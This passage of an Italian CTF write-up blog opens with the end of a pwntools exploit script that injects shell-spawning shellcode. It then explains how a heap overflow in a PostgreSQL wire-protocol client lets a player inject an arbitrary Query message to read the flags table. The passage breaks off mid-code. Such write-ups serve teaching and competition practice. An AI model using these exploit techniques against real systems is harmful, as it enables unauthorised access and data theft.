+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;edit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">992</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Leak: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Orig: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x202060</span> <span class="o">+</span> <span class="mi">4861</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;F: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">f</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;create&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;create&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;edit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="pg-slop-notes-">PG Slop Notes 🔥<a hidden class="anchor" aria-hidden="true" href="#pg-slop-notes-">#</a></h2>
+<p>Questa challenge è stata davvero una bomba. <code>@Renny</code> ed io ci siamo divertiti così tanto a risolverla che, dopo un po’, abbiamo smesso di preoccuparci della scoreboard e volevamo solo continuare a giocare con il binario.</p>
+<p>Il servizio esponeva un’interfaccia “sloppy” verso un database PostgreSQL remoto. Il binario in sé era solo un client: si connetteva a un DB remoto e permetteva all’utente di interagirci tramite un semplice menu:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">menu</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1 &gt; New note&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2 &gt; Search note by ID&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3 &gt; Search note by owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4 &gt; Edit note&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;5 &gt; Delete note&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;6 &gt; Exit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Dal lato remoto, lo schema del database era il seguente:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">notes</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="nb">serial</span><span class="w"> </span><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">content</span><span class="w"> </span><span class="nb">text</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">created_at</span><span class="w"> </span><span class="k">timestamp</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="k">current_timestamp</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">owner</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">secret_key</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">null</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">flags</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">flag</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="w"> </span><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">flags</span><span class="w"> </span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;snakeCTF{placeholder}&#39;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>La flag era salvata in una tabella dedicata <code>flags</code>, e nessuna delle funzioni “normali” del programma la toccava mai: non c’era nessuna opzione del menu che facesse riferimento a <code>flags</code>.
+Quindi l’unico modo realistico per recuperare la flag era in qualche modo manomettere l’SQL inviato, oppure abusare direttamente del wire protocol di PostgreSQL.</p>
+<p>La particolarità interessante era che il binario non usava i semplici messaggi <code>Query</code> del protocollo, ma sfruttava l’extended query protocol di PostgreSQL, costruendo messaggi come Bind, Describe, Execute e Sync, che venivano poi inviati come un unico buffer combinato sul socket.</p>
+<p>La funzione <code>pg_conn_run_prepared_stmt</code> era responsabile dell’invio di uno prepared statement e dei relativi parametri. Internamente creava quattro messaggi in questo ordine:</p>
+<ul>
+<li>un messaggio <strong>Bind</strong> che prendeva uno prepared statement e alcuni parametri e li trasformava in un portal,</li>
+<li>un messaggio <strong>Describe</strong> per ottenere i metadati del portal o dello statement,</li>
+<li>un messaggio <strong>Execute</strong> per eseguire effettivamente il portal,</li>
+<li>e un ultimo messaggio <strong>Sync</strong> per flushare tutto e riportare il server in uno stato consistente.</li>
+</ul>
+<p>Tutti e quattro i messaggi venivano poi serializzati in un unico buffer contiguo sull’heap e scritti sul socket con una singola <code>send()</code>.</p>
+<p>Il messaggio Bind è quello che conta di più per l’exploit, perché è il punto in cui i dati controllati dall’utente (content della nota, owner, secret key) vengono impacchettati nel protocollo.</p>
+<p>La sua struttura, semplificata, è più o meno questa. Prima c’è un header con il tipo di messaggio (<code>'B'</code>), la lunghezza complessiva, il nome del portal e il nome dello statement:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">+--------+-----------------------+------------------------------+-------------------------------+
+</span></span><span class="line"><span class="cl">| 1 byte | 4 bytes               | variable                     | variable                      |
+</span></span><span class="line"><span class="cl">| &#39;B&#39;    | length (Int32)        | portal name (String, C-str)  | statement name (String)       |
+</span></span><span class="line"><span class="cl">+--------+-----------------------+------------------------------+-------------------------------+
+</span></span><span class="line"><span class="cl">                                      ^
+</span></span><span class="line"><span class="cl">                                      length includes everything from here to the end
+</span></span></code></pre></div><p>Poi arrivano i format dei parametri, i valori dei parametri e i format del risultato. La parte chiave per noi è come vengono codificati i parametri: per ogni parametro c’è un campo di lunghezza a 4 byte seguito da quel numero di byte, oppure <code>-1</code> se il parametro è NULL.</p>
+<p>Gli altri messaggi (Describe, Execute, Sync) sono relativamente semplici:</p>
+<ul>
+<li>Describe contiene un flag di tipo (“statement” o “portal”) e un nome.</li>
+<li>Execute contiene il nome del portal e un max-row count.</li>
+<li>Sync è sostanzialmente un messaggio di dimensione fissa che dice “flush tutto”.</li>
+</ul>
+<p>La cosa importante non sono tanto le loro semantiche, quanto il fatto che tutti vengono scritti in un singolo buffer dopo il Bind. Il layout in memoria è quindi:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[ Bind ][ Describe ][ Execute ][ Sync ]
+</span></span></code></pre></div><p>Se riusciamo a far calcolare male la dimensione del messaggio Bind, possiamo andare in overflow sui messaggi successivi.</p>
+<p>La funzionalità “New note” ci dava esattamente la primitive di cui avevamo bisogno. L’handler per la creazione di una nuova nota leggeva il content dallo stdin usando <code>read()</code> e poi lo usava come primo parametro per lo prepared statement <code>insert_note</code>.</p>
+<p>Il codice era questo:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Content: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">len</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">content_buf</span><span class="p">,</span> <span class="mh">0x1FFu</span><span class="p">);</span> <span class="c1">// 511 bytes max
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">content_buf</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">content_buf</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">content_buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Owner: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">owner</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">gen_random_secret_key</span><span class="p">(</span><span class="n">secret_key</span><span class="p">,</span> <span class="mh">0x11u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">secret_key</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="n">content_buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">params</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">length</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>              <span class="c1">// uses length as returned by read()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">params</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">length</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">owner</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="n">secret_key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">params</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="nf">pg_conn_run_prepared_stmt</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="s">&#34;insert_note&#34;</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="n">params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&amp;&amp;</span> <span class="n">result</span><span class="o">-&gt;</span><span class="n">row_count</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;Note created with ID: %.*s.</span><span class="se">\n</span><span class="s">Use secret key %.16s to edit/delete.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="o">***</span><span class="n">result</span><span class="o">-&gt;</span><span class="n">rows</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">**</span><span class="n">result</span><span class="o">-&gt;</span><span class="n">rows</span> <span class="o">+</span> <span class="mi">4LL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="n">secret_key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Failed to create note&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">pg_query_result_free</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid content length.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>La sottigliezza sta in <code>params[0].length = len;</code>. Quel <code>len</code> è il valore di ritorno di <code>read()</code>, che conta i byte grezzi, inclusi eventuali <code>\0</code> nel mezzo dell’input.</p>
+<p>Più avanti, quando viene costruito il messaggio Bind, la funzione <code>pg_msg_get_size</code> viene usata per calcolare quanto grande sarà il messaggio. Questa dimensione viene poi usata per allocare il buffer sull’heap che conterrà i messaggi Bind + Describe + Execute + Sync. Tuttavia <code>pg_msg_get_size</code> usa <code>strlen()</code> sui valori dei parametri invece dei campi di lunghezza espliciti.</p>
+<p>L’implementazione di <code>pg_msg_get_size</code> per Bind è (semplificando) la seguente:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">pg_msg_get_size</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">param_sizes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">(</span><span class="n">msg</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">param_sizes</span> <span class="o">+=</span> <span class="nf">strlen</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">msg</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">))</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">msg</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>    <span class="c1">// statement name
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="n">v1</span> <span class="o">+</span> <span class="nf">strlen</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">msg</span> <span class="o">+</span> <span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="n">param_sizes</span> <span class="o">+</span> <span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Quindi la dimensione del messaggio Bind viene calcolata sommando <code>strlen(parameter_value) + 4</code> per ogni parametro. Se il nostro content contiene un byte nullo in mezzo, <code>strlen()</code> si ferma a quel byte e vede una stringa più corta rispetto a quella che abbiamo effettivamente fornito.</p>
+<p>Considera un input del tipo:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&#34;AAAA\x00AAAA\n&#34;
+</span></span></code></pre></div><p>La <code>read()</code> vede 10 byte: quattro <code>A</code>, un <code>\0</code>, altre quattro <code>A</code> e un newline. Quindi <code>len = 10</code>. Il programma sostituisce il newline con un null terminator, ma la stringa contiene ancora il primo <code>\0</code> in mezzo. Se chiami <code>strlen(content_buf)</code> ottieni solo 4, perché si ferma al primo <code>\0</code>.</p>
+<p>Questo crea un mismatch:</p>
+<ul>
+<li>La struttura del parametro per Bind dice “length = 10”.</li>
+<li>Il calcolo della dimensione del Bind, usando <code>strlen()</code>, dice “questo parametro ha 4 byte di dati”.</li>
+</ul>
+<p>L’allocazione sull’heap per i messaggi combinati usa <code>pg_msg_get_size(bind_msg)</code> con la dimensione più corta, quindi il buffer allocato è troppo piccolo per i dati che verranno copiati in seguito.</p>
+<p>Il colpo di grazia è il codice che serializza effettivamente i parametri del Bind nel buffer. Ricalcola <code>vlen</code> con <code>strlen()</code>, ma poi usa il campo <code>.length</code> (preso da <code>read()</code>) come size per la copia:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">msg</span><span class="o">-&gt;</span><span class="n">param_count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">vlen</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">param_values</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span> <span class="c1">// short length
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="nf">htonl</span><span class="p">(</span><span class="n">vlen</span><span class="p">);</span>  <span class="c1">// this is what is encoded into the message
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">offsetb</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="n">offsetb</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">         <span class="n">msg</span><span class="o">-&gt;</span><span class="n">param_values</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">msg</span><span class="o">-&gt;</span><span class="n">param_values</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>       <span class="c1">// copies full read() length
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">offset</span> <span class="o">=</span> <span class="n">vlen</span> <span class="o">+</span> <span class="n">offsetb</span><span class="p">;</span>                   <span class="c1">// advances only by vlen, not by copied bytes
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>In altre parole, il serializer del Bind:</p>
+<ul>
+<li>dice a PostgreSQL “ci sono vlen byte di dati per il parametro”,</li>
+<li>in realtà scrive nel buffer <code>length</code> byte controllati dall’utente, che possono essere più grandi di <code>vlen</code>,</li>
+<li>e poi avanza l’offset come se avesse scritto solo <code>vlen</code> byte.</li>
+</ul>
+<p>Dato che anche il buffer sull’heap è stato dimensionato usando <code>strlen()</code>, la combinazione di questi errori porta a un heap buffer overflow: i dati controllati dall’utente dal Bind traboccano oltre la fine di dove il messaggio Bind avrebbe dovuto fermarsi.</p>
+<p>Torniamo ora a <code>pg_conn_run_prepared_stmt</code>. Dopo aver calcolato tutte le dimensioni, alloca un unico buffer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">bind_msg_size</span>     <span class="o">=</span> <span class="nf">pg_msg_get_size</span><span class="p">(</span><span class="n">bind_msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">describe_msg_size</span> <span class="o">=</span> <span class="nf">pg_msg_get_size</span><span class="p">(</span><span class="n">describe_msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">execute_msg_size</span>  <span class="o">=</span> <span class="nf">pg_msg_get_size</span><span class="p">(</span><span class="n">execute_msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="o">=</span> <span class="n">execute_msg_size</span> <span class="o">+</span> <span class="n">describe_msg_size</span> <span class="o">+</span> <span class="n">bind_msg_size</span> <span class="o">+</span> <span class="nf">pg_msg_get_size</span><span class="p">(</span><span class="n">sync_msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">total</span><span class="p">);</span>
+</span></span></code></pre></div><p>Poi serializza ciascun messaggio nella posizione corretta:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">sync_msg_size</span>      <span class="o">=</span> <span class="nf">pg_msg_serialize_to</span><span class="p">(</span><span class="n">sync_msg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">execute_msg_size</span> <span class="o">+</span> <span class="n">describe_msg_size</span> <span class="o">+</span> <span class="n">bind_msg_size</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="n">execute_msg_sizea</span>  <span class="o">=</span> <span class="nf">pg_msg_serialize_to</span><span class="p">(</span><span class="n">execute_msg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">describe_msg_size</span> <span class="o">+</span> <span class="n">bind_msg_size</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="n">describe_msg_sizea</span> <span class="o">=</span> <span class="nf">pg_msg_serialize_to</span><span class="p">(</span><span class="n">describe_msg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">bind_msg_size</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="n">bind_msg_sizea</span>     <span class="o">=</span> <span class="nf">pg_msg_serialize_to</span><span class="p">(</span><span class="n">bind_msg</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span></code></pre></div><p>Quindi il layout previsto è:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">buf:
+</span></span><span class="line"><span class="cl">  [ Bind ][ Describe ][ Execute ][ Sync ]
+</span></span></code></pre></div><p>Tuttavia, la serializzazione del Bind scrive più byte di <code>bind_msg_size</code> a causa del mismatch sulla lunghezza. Questo significa che i dati del Bind vanno in overflow sulla porzione che avrebbe dovuto contenere i messaggi Describe, Execute e Sync.</p>
+<p>Dal nostro punto di vista, questa è una primitive molto potente: controlliamo ora una parte di memoria che verrà inviata tale e quale sulla rete dopo un Bind valido. Scegliendo con cura il contenuto dell’overflow, possiamo sovrascrivere i messaggi successivi con byte arbitrari del protocollo.</p>
+<p>Ancora meglio, mettendo il byte nullo all’inizio del content della nota, facciamo in modo che <code>strlen(content_buf)</code> sia praticamente zero pur avendo fino a 510 byte letti da <code>read()</code>. Questo massimizza la differenza tra la dimensione “dichiarata” e i dati effettivamente scritti, dandoci una grossa area da sovrascrivere.</p>
+<p>Alla fine, invece del layout originale:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">+---+---+---+---+
+</span></span><span class="line"><span class="cl">| B | D | E | S |  (intended)
+</span></span><span class="line"><span class="cl">+---+---+---+---+
+</span></span></code></pre></div><p>otteniamo di fatto:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">+---+-----------+
+</span></span><span class="line"><span class="cl">| B | Q-crafted |  (what we actually send)
+</span></span><span class="line"><span class="cl">+---+-----------+
+</span></span></code></pre></div><p>Il Bind resta valido, ma il resto dello stream diventa ciò che abbiamo iniettato noi. In particolare, possiamo scrivere un messaggio <code>Query</code> (<code>'Q'</code>) con SQL arbitrario.</p>
+<p>Abbiamo ancora bisogno di un modo per farci tornare il risultato della query malevola. Qui entra in gioco la logica di stampa della “New note”.</p>
+<p>Dopo che <code>pg_conn_run_prepared_stmt</code> ritorna, la funzione controlla il risultato e, se almeno una row è stata restituita, stampa un ID come stringa:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="nf">pg_conn_run_prepared_stmt</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="s">&#34;insert_note&#34;</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="n">params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&amp;&amp;</span> <span class="n">result</span><span class="o">-&gt;</span><span class="n">row_count</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span>
